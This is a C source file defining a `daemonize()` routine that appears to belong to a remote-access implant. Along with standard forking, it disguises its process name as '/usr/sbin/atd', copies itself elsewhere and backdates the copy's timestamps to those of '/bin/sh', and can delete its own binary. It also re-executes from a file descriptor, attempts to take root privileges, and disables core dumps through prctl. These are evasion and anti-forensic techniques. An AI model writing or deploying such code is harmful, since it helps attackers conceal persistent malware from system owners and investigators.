#define _GNU_SOURCE
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <limits.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <utime.h>
#include <sys/stat.h>
#include <string.h>
#include <errno.h>
#ifdef Linux
#include <linux/fs.h>
#include <sys/prctl.h>
#include "memfd.h"
#endif

#ifndef DEFAULT_MTIME_FROM
 #define DEFAULT_MTIME_FROM "/bin/sh"
#endif

#ifndef DEFAULT_ARGV0
 #define DEFAULT_ARGV0 "/usr/sbin/atd"
#endif

#ifdef USE_ENV_ARGS
 #ifndef DEFAULT_ENV_SA0
  #define DEFAULT_ENV_SA0 "__SA0"
 #endif

 #ifndef DEFAULT_ENV_SCWD
  #define DEFAULT_ENV_SCWD "__SCWD"
 #endif

 #ifndef DEFAULT_ENV_CLEANUP
  #define DEFAULT_ENV_CLEANUP "__CLEANUP"
 #endif

 #ifndef DEFAULT_ENV_MOVE
  #define DEFAULT_ENV_MOVE "__MOVE"
 #endif

#endif

#ifndef DEFAULT_SAFE_PATH
#define DEFAULT_SAFE_PATH "/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin"
#endif

#ifndef __O_CLOEXEC
# define __O_CLOEXEC   02000000
#endif

#ifndef O_CLOEXEC
# define O_CLOEXEC  __O_CLOEXEC
#endif

#include "daemonize.h"

pid_t daemonize(int argc, char *argv[], char *env[], bool exit_parent) {
    pid_t pid;
    int i;

    int pipes[2];

#ifdef Linux
    setresuid(0, 0, 0);
#else
    setuid(0);
#endif

    bool triple_fork = true;

    /* If we are launched directly from the init - don't do the triple fork
       dance. This is important in case we are launched from upstart */

    if (getppid() == 1)
        triple_fork = false;

    /* Cleanup environment and reexec */
    char self[PATH_MAX] = {};
    char *fd_str = getenv("_");
    int fdenv = -1;

    if (fd_str) {
        char *end = NULL;
        errno = 0;
        fdenv = strtol(fd_str, &end, 10);
        if ((end == fd_str) || errno) {
            fdenv = -1;
        }
    }

    if (triple_fork && exit_parent && fdenv < 0 && readlink("/proc/self/exe", self, sizeof(self)-1) != -1) {
#ifdef USE_ENV_ARGS
        char *set_argv0 = getenv(DEFAULT_ENV_SA0);
        char *set_cwd = getenv(DEFAULT_ENV_SCWD);
        char *cleanup = getenv(DEFAULT_ENV_CLEANUP);
        char *move = getenv(DEFAULT_ENV_MOVE);
        char *mtime_from = DEFAULT_MTIME_FROM;
#else
        char *set_argv0 = NULL;
        char *set_cwd = NULL;
        char *move = NULL;
        char *mtime_from = DEFAULT_MTIME_FROM;

        bool cleanup = false;

        char c;

        while ((c = getopt (argc, argv, "0:t:c:m:C")) != -1)
            switch (c) {
            case '0': set_argv0 = optarg; break;
            case 't': mtime_from = optarg; break;
            case 'c': set_cwd = optarg; break;
            case 'm': move = optarg; break;
            case 'C': cleanup = true; break;
            };
#endif

        putenv("_=0");

        int fd = -1;

#ifdef Linux
        if (strstr(self, "/memfd")) {
            snprintf(self, sizeof(self), "/proc/%d/exe", getpid());
        }
#endif

        struct stat _stat = {};
        stat(mtime_from, &_stat);

        if (move) {
            fd = open(self, O_RDONLY);
            unlink(move);
            int fd2 = open(move, O_RDWR | O_CREAT, 0700);
            if (fd2 == -1) {
                move = NULL;
            } else {
                for (;;) {
                    char buffer[4096] = {};
                    int r = read(fd, buffer, sizeof(buffer));
                    if (r <= 0) {
                        close(fd);
                        if (r == -1) {
                            unlink(move);
                            move = NULL;
                        } else {
                            unlink(self);
                            fchmod(fd2, 0511);
                            fchown(fd2, 0, 0);

                            if (_stat.st_mtime) {
                                struct utimbuf _times = {
                                    .actime = _stat.st_atime,
                                    .modtime = _stat.st_mtime,
                                };

                                utime(move, &_times);
                            }
                        }
                        close(fd2);
                        break;
                    }
                    int w = write(fd2, buffer, r);
                    if (w < 0) {
                        close(fd2);
                        close(fd);
                        unlink(move);
                        move = NULL;
                        break;
                    }
                }
            }
        }

        fd = open(move? move:self, O_CLOEXEC | O_RDONLY);
        if (fd == -1) {
            fd = open(move? move:self, O_RDONLY);
        }

        int envpipe[2] = {};

        if (fd != -1) {
            if (cleanup) {
                unlink(move? move:self);
            }

            char *const argv[] = {
                set_argv0? set_argv0 : DEFAULT_ARGV0,
                NULL
            };

            char fdenv_pass[PATH_MAX] = {};
            int r = pipe(envpipe);

            snprintf(fdenv_pass, sizeof(fdenv_pass), "_=%d", r? 0: envpipe[0]);

            char *const env[] = {
                r == 0? fdenv_pass : NULL,
                NULL
            };

            chdir(set_cwd? set_cwd : "/");

            pid_t next = fork();
            if (next == 0 || next == -1) {
                if (r == 0)
                    close(envpipe[1]);

#ifdef Linux
                fexecve(fd, argv, env);
                /* We shouldn't be here */
#endif
	    	execve(move? move:self, argv, env);
            }

            if (r == 0)
                close(envpipe[0]);
        }
        close(fd);

        int idx = 0;
        for (idx=0;env[idx];idx++) {
            unsigned int size = strlen(env[idx]);
            int r = write(envpipe[1], &size, 4);
            if (r != 4) {
                break;
            }
            r = write(envpipe[1], env[idx], size);
            if (r != size) {
                break;
            }
        }
        close(envpipe[1]);
        exit(0);
    }

    if (fdenv > 0) {
        for (;;) {
            unsigned int size = 0;
            int r = read(fdenv, &size, 4);
            if (r != 4) {
                break;
            }
            char envstr[PATH_MAX] = {};
            if (size > PATH_MAX-1) {
                break;
            }
            r = read(fdenv, envstr, size);
            if (!r || r != size) {
                break;
            }
            envstr[size] = '\0';
            r = putenv(strdup(envstr));
        }
        close(fdenv);
    }


    /* Daemonize */
    if (!exit_parent) {
        if (pipe(pipes) == -1) {
            return -1;
        }
    }

    /* create new process */
    pid = fork();
    if (pid == -1)
        return -1;

    else if (pid != 0) {
        if (exit_parent) {
            exit (EXIT_SUCCESS);
        } else {
            int status;
            waitpid(pid, &status, 0);
            if (read(pipes[0], &pid, sizeof(pid)) != sizeof(pid))
                pid = -1;

            return pid;
        }
    }

    if (triple_fork) {
        /* Fork once again */
        pid = fork();
        if (pid == -1) {
            if (!exit_parent) {
                close(pipes[1]);
            }

            return -1;
        }

        else if (pid != 0) {
            exit (EXIT_SUCCESS);
        }
    }

    setenv("_", "/bin/true", 1);

    if (!exit_parent) {
        pid_t current_pid = getpid();
        write(pipes[1], &current_pid, sizeof(current_pid));
        close(pipes[1]);
    }

    /* create new session and process group */
    if (setsid ( ) == -1)
        return -1;

#ifndef DEBUG
    /* close all open files--NR_OPEN is overkill, but works */
    for (i = 0; i < sysconf(_SC_OPEN_MAX); i++)
        close (i);

    /* redirect fd's 0,1,2 to /dev/null */
    open ("/dev/null", O_RDWR);
    /* stdin */
    dup (0);
    /* stdout */
    dup (0);
    /* stderror */

#ifdef Linux
    prctl(4, 0, 0, 0, 0);
    prctl(31, 0, 0, 0, 0);
#endif
#endif

    /* do its daemon thing... */
    return 0;
}
